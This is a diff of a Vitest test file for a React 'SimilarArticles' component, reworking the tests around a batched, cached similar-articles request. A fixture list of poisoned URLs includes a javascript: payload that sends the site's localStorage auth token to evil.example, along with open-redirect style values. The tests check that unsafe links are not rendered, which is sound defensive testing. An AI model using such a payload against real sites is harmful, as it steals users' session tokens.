@@ -1,6 +1,6 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 import { render, screen, waitFor } from '@testing-library/react'
-import type { ComponentType } from 'react'
+import SimilarArticles from './SimilarArticles'
 
 const POISONED_URLS = [
   "javascript:fetch('https://evil.example/?t='+localStorage.getItem('vccircle_auth_token'))",
@@ -13,51 +13,50 @@ const POISONED_URLS = [
   '\\/evil.com',
 ]
 
-interface ArticleListProps {
-  articleId: number | string
-  limit?: number
-  compact?: boolean
+// The component no longer fetches per card: it asks the shared client in
+// app/lib/similar.ts, which coalesces a view's cards into one batched
+// request. Each case below gets its own article id, so one case's cached
+// answer cannot answer another case's request.
+let nextArticleId = 1000
+let mockedArticleId = 0
+
+function mockSimilarArticles(urls: string[]) {
+  mockedArticleId = nextArticleId++
+  vi.stubGlobal(
+    'fetch',
+    vi.fn().mockResolvedValue({
+      ok: true,
+      json: async () => ({
+        results: [
+          {
+            article_id: mockedArticleId,
+            similar_articles: urls.map((url, i) => ({
+              id: 100 + i,
+              title: `Article ${i}`,
+              url,
+              category: 'Deals',
+            })),
+          },
+        ],
+      }),
+    })
+  )
 }
 
-// The component memoises successful responses in a module-level Map (#257), so
-// its state outlives a single test. A static top-level import would bind one
-// module instance for the whole file and the first case's result would be
-// served to every later test. Each test therefore gets a freshly evaluated
-// module, which is what actually gives it an empty memo.
-let SimilarArticles: ComponentType<ArticleListProps>
+function renderAndWait(compact: boolean) {
+  const view = render(<SimilarArticles articleId={mockedArticleId} compact={compact} />)
+  return waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0)).then(
+    () => view
+  )
+}
 
-beforeEach(async () => {
-  vi.resetModules()
+beforeEach(() => {
   vi.clearAllMocks()
-  SimilarArticles = (await import('./SimilarArticles')).default
 })
 
 afterEach(() => {
   vi.unstubAllGlobals()
 })
-
-function mockSimilarArticles(urls: string[]) {
-  const fetchMock = vi.fn().mockResolvedValue({
-    ok: true,
-    json: async () => ({
-      similar_articles: urls.map((url, i) => ({
-        id: 100 + i,
-        title: `Article ${i}`,
-        url,
-        category: 'Deals',
-      })),
-    }),
-  })
-  vi.stubGlobal('fetch', fetchMock)
-  return fetchMock
-}
-
-function renderAndWait(compact: boolean) {
-  const view = render(<SimilarArticles articleId={1} compact={compact} />)
-  return waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0)).then(
-    () => view
-  )
-}
 
 describe('SimilarArticles — unsafe backend URLs are not clickable', () => {
   it.each(POISONED_URLS)('compact list renders no link for %j', async (url) => {
@@ -104,96 +103,123 @@ describe('SimilarArticles — safe URLs still link out', () => {
   })
 })
 
-describe('SimilarArticles — a repeated id is not refetched (#257)', () => {
-  it('fetches once and serves the second mount of the same id from the memo', async () => {
-    const fetchMock = mockSimilarArticles(['https://vccircle.com/news/deal-1'])
+/**
+ * The request pattern, not the payload. Before #353 each card fetched its own
+ * `/recommend/similar/{id}`, so a `top_k=8` view cost eight round trips --
+ * and, because the cache lived in the component, another eight on every
+ * return to the page. These pin the two properties that replaced it.
+ */
+describe('SimilarArticles — a view costs one request, not one per card', () => {
+  function mockBatch(
+    articlesFor: (articleId: number) => { title: string; url: string }[]
+  ) {
+    const fetchMock = vi.fn(async (_url: string, init: RequestInit) => ({
+      ok: true,
+      json: async () => {
+        const { article_ids: ids } = JSON.parse(String(init.body)) as {
+          article_ids: number[]
+        }
+        return {
+          results: ids.map((articleId) => ({
+            article_id: articleId,
+            similar_articles: articlesFor(articleId),
+          })),
+        }
+      },
+    }))
+    vi.stubGlobal('fetch', fetchMock)
+    return fetchMock
+  }
 
-    const first = await renderAndWait(false)
+  const oneNear = (articleId: number) => [
+    { id: articleId * 100, title: `Near ${articleId}`, url: `https://vccircle.com/near/${articleId}` },
+  ]
+
+  it('sends a single request carrying every result in the view', async () => {
+    const fetchMock = mockBatch(oneNear)
+    const ids = [1, 2, 3, 4, 5, 6, 7, 8]
+
+    render(
+      <>
+        {ids.map((id) => (
+          <SimilarArticles key={id} articleId={id} limit={3} compact />
+        ))}
+      </>
+    )
+    await waitFor(() => expect(screen.getAllByText(/^Near \d+$/)).toHaveLength(8))
+
     expect(fetchMock).toHaveBeenCalledTimes(1)
+    const [url, init] = fetchMock.mock.calls[0]
+    expect(url).toContain('/recommend/similar/batch')
+    expect(init.method).toBe('POST')
+    expect(JSON.parse(String(init.body))).toEqual({ article_ids: ids, limit: 3 })
+  })
+
+  it('a card that remounts inside the client TTL asks for nothing', async () => {
+    const fetchMock = mockBatch(oneNear)
+
+    const first = render(<SimilarArticles articleId={42} limit={3} compact />)
+    await waitFor(() => expect(screen.getByText('Near 42')).toBeTruthy())
     first.unmount()
 
-    const { container } = await renderAndWait(false)
+    render(<SimilarArticles articleId={42} limit={3} compact />)
+    await waitFor(() => expect(screen.getByText('Near 42')).toBeTruthy())
 
     expect(fetchMock).toHaveBeenCalledTimes(1)
-    expect(container.querySelector('a[href]')?.getAttribute('href')).toBe(
-      'https://vccircle.com/news/deal-1'
+  })
+
+  it('an unindexable result id does not cost the rest of the view its list', async () => {
+    const fetchMock = mockBatch(oneNear)
+
+    render(
+      <>
+        <SimilarArticles articleId="not-an-id" limit={3} compact />
+        <SimilarArticles articleId={77} limit={3} compact />
+      </>
     )
+    await waitFor(() => expect(screen.getByText('Near 77')).toBeTruthy())
+
+    // Sent alone, so a result the server could not search for cannot fail
+    // validation for the whole batch and blank every other card.
+    expect(JSON.parse(String(fetchMock.mock.calls[0][1].body)).article_ids).toEqual([77])
+    expect(fetchMock).toHaveBeenCalledTimes(1)
   })
 
-  it('treats a different limit as a different request', async () => {
-    const fetchMock = mockSimilarArticles(['https://vccircle.com/news/deal-1'])
-
-    const view = render(<SimilarArticles articleId={1} limit={3} compact />)
-    await waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0))
-    view.unmount()
-
-    render(<SimilarArticles articleId={1} limit={7} compact />)
-    await waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0))
-
-    // Same id, different limit: the memo key includes the limit, so this is a
-    // genuine second request rather than a cache hit.
-    expect(fetchMock).toHaveBeenCalledTimes(2)
-  })
-
-  it('does not memoize a failed request, so a later mount can retry', async () => {
-    const fetchMock = vi
-      .fn()
-      .mockResolvedValueOnce({ ok: false })
-      .mockResolvedValue({
-        ok: true,
-        json: async () => ({
-          similar_articles: [
-            {
-              id: 1,
-              title: 'Article 0',
-              url: 'https://vccircle.com/news/retry',
-              category: 'Deals',
-            },
-          ],
-        }),
-      })
+  it('a failed request is not remembered, so a remount tries again', async () => {
+    const fetchMock = vi.fn().mockResolvedValue({ ok: false, json: async () => ({}) })
     vi.stubGlobal('fetch', fetchMock)
 
-    const failed = render(<SimilarArticles articleId={1} compact />)
+    const first = render(<SimilarArticles articleId={55} limit={3} compact />)
     await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(1))
-    failed.unmount()
+    expect(screen.queryByText(/^Near /)).toBeNull()
+    first.unmount()
 
-    render(<SimilarArticles articleId={1} compact />)
-    await waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0))
-
-    expect(fetchMock).toHaveBeenCalledTimes(2)
+    render(<SimilarArticles articleId={55} limit={3} compact />)
+    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(2))
   })
 
-  it('does not memoize an empty result, so a later mount can retry', async () => {
-    // An empty `similar_articles` is a legitimate answer, not a failure, so it
-    // has to reach the UI. Caching it as "nothing similar" would pin the empty
-    // state for the life of the tab and the article would never light up even
-    // after the index caught up.
-    const fetchMock = vi
-      .fn()
-      .mockResolvedValueOnce({ ok: true, json: async () => ({ similar_articles: [] }) })
-      .mockResolvedValue({
-        ok: true,
-        json: async () => ({
-          similar_articles: [
-            {
-              id: 1,
-              title: 'Article 0',
-              url: 'https://vccircle.com/news/late',
-              category: 'Deals',
-            },
-          ],
-        }),
-      })
-    vi.stubGlobal('fetch', fetchMock)
+  it('a view wider than the server cap asks again rather than dropping its tail', async () => {
+    const fetchMock = mockBatch(oneNear)
+    // Disjoint from the ids the cases above used, so none of these are
+    // already answered from the cache the client keeps between tests.
+    const ids = Array.from({ length: 25 }, (_, i) => i + 1000)
 
-    const empty = render(<SimilarArticles articleId={1} compact />)
-    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(1))
-    empty.unmount()
+    render(
+      <>
+        {ids.map((id) => (
+          <SimilarArticles key={id} articleId={id} limit={3} compact />
+        ))}
+      </>
+    )
+    await waitFor(() => expect(screen.getAllByText(/^Near \d+$/)).toHaveLength(25))
 
-    render(<SimilarArticles articleId={1} compact />)
-    await waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0))
-
+    // 25 ids at the server's 20-id cap is two requests, and every id asked
+    // for is answered: an id quietly dropped settles as "no similar
+    // articles", which is indistinguishable from the truth.
     expect(fetchMock).toHaveBeenCalledTimes(2)
+    const asked = fetchMock.mock.calls.flatMap(([, init]) =>
+      JSON.parse(String(init.body)).article_ids
+    )
+    expect(asked).toEqual(ids)
   })
 })
